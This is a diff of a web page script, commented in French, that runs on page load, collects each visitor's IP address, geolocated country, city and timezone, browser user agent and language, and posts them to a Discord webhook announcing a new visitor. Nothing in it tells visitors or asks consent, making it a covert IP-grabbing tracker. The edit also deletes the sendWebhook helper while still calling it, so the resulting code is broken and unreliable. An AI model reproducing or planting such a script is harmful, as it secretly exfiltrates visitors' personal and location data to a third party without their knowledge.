@@ -27,76 +27,69 @@
             return data;
         };
 
-        const sendWebhook = async (embed) => {
-            await fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    embeds: [embed]
-                })
-            });
-        };
-
         const sendWebhookWithMessage = async () => {
-            const ipAddress = await getIpAddress();
-            const ipGeolocationData = await getIpGeolocation(ipAddress);
+    const ipAddress = await getIpAddress();
+    const ipGeolocationData = await getIpGeolocation(ipAddress);
 
-            const currentDate = new Date().toLocaleString();
+    const currentDate = new Date().toLocaleString();
 
-            const embed = {
-                title: "<:7155partner:1210210425682141194> Nouveau membre a rejoint le site!",
-                color: 0x2b2d31,
-                image: {
-                    url: "https://media.discordapp.net/attachments/1209907966501855313/1210906616195457045/standard_5.gif?ex=65ec43aa&is=65d9ceaa&hm=f40a4e7cc1372d0fdcaa53bb4e2da6709588e2234e3651eaa013d8de2e6bb5bf&=&width=936&height=120"
-                },
-                fields: [
-                    {
-                        name: "Adresse IP",
-                        value: `\`${ipAddress}\``,
-                        inline: true
-                    },
-                    {
-                        name: "Pays",
-                        value: `\`${ipGeolocationData.country_name}\``,
-                        inline: true
-                    },
-                    {
-                        name: "Ville",
-                        value: `\`${ipGeolocationData.city}\``,
-                        inline: true
-                    },
-                    {
-                        name: "Fuseau horaire",
-                        value: `\`${ipGeolocationData.time_zone}\``,
-                        inline: true
-                    },
-                    {
-                        name: "Date",
-                        value: `\`${currentDate}\``,
-                        inline: true
-                    },
-                    {
-                        name: "Navigateur",
-                        value: `\`${window.navigator.userAgent}\``,
-                        inline: true
-                    },
-                    {
-                        name: "Langue du navigateur",
-                        value: `\`${window.navigator.language}\``,
-                        inline: true
-                    }
-                ]
-            };
+    let langueNavigateur = window.navigator.language;
+    let drapeau = '';
 
-            // Envoie du message via le webhook Discord
-            await sendWebhook(embed);
-        };
+    // Vérifie si la langue du navigateur est le français
+    if (langueNavigateur.toLowerCase() === 'fr' || langueNavigateur.toLowerCase() === 'fr-fr') {
+        langueNavigateur = '🇫🇷 Français';
+        drapeau = '🇫🇷';
+    }
 
-        // Appelle la fonction au chargement de la page
-        sendWebhookWithMessage();
-    </script>
-</body>
+    const embed = {
+        title: "<:7155partner:1210210425682141194> Nouveau membre a rejoint le site!",
+        color: 0x2b2d31,
+        image: {
+            url: "https://media.discordapp.net/attachments/1209907966501855313/1210906616195457045/standard_5.gif?ex=65ec43aa&is=65d9ceaa&hm=f40a4e7cc1372d0fdcaa53bb4e2da6709588e2234e3651eaa013d8de2e6bb5bf&=&width=936&height=120"
+        },
+        fields: [
+            {
+                name: "Adresse IP",
+                value: `\`${ipAddress}\``,
+                inline: true
+            },
+            {
+                name: "Pays",
+                value: `\`${ipGeolocationData.country_name}\``,
+                inline: true
+            },
+            {
+                name: "Ville",
+                value: `\`${ipGeolocationData.city}\``,
+                inline: true
+            },
+            {
+                name: "Fuseau horaire",
+                value: `\`${ipGeolocationData.time_zone}\``,
+                inline: true
+            },
+            {
+                name: "Date",
+                value: `\`${currentDate}\``,
+                inline: true
+            },
+            {
+                name: "Navigateur",
+                value: `\`${window.navigator.userAgent}\``,
+                inline: true
+            },
+            {
+                name: "Langue du navigateur",
+                value: `\`${langueNavigateur} ${drapeau}\``,
+                inline: true
+            }
+        ]
+    };
 
-</html>
+    // Envoie du message via le webhook Discord
+    await sendWebhook(embed);
+};
+
+// Appelle la fonction au chargement de la page
+sendWebhookWithMessage();
